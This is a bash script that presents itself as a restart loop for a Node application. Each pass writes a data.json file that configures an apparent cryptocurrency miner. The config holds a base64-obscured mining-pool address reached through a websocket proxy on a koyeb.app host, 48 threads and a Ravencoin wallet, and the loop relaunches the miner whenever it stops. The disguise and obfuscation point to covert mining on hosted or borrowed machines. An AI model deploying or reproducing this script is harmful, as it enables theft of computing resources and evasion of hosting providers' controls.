#!/bin/bash

# This script will run the node application in a continuous loop.
# If the application crashes or is terminated, it will wait for a short
# period and then restart it automatically.

# Infinite loop to keep the process running
while true; do
  echo "INFO: Preparing to start the node process..."

  # Create the data.json configuration file
  cat <<EOF > data.json
{
  "proxy": "wss://ratty-adoree-ananta512-4abadf1a.koyeb.app/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
  "config": { "threads": 48, "log": true },
  "options": { "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", "password": "c=RVN", "argent": "testcpu" }
}
EOF

  echo "INFO: data.json created successfully."

  # Start the node process in the background
  node app.js &
  
  # Get the Process ID (PID) of the last background command
  pid=$!
  
  echo "SUCCESS: Node process started with PID $pid."
  
  # Wait for the process to exit
  wait $pid
  
  echo "WARNING: Node process with PID $pid has stopped. Restarting in 10 seconds..."
  
  # Wait for 10 seconds before the next iteration
  sleep 10
done
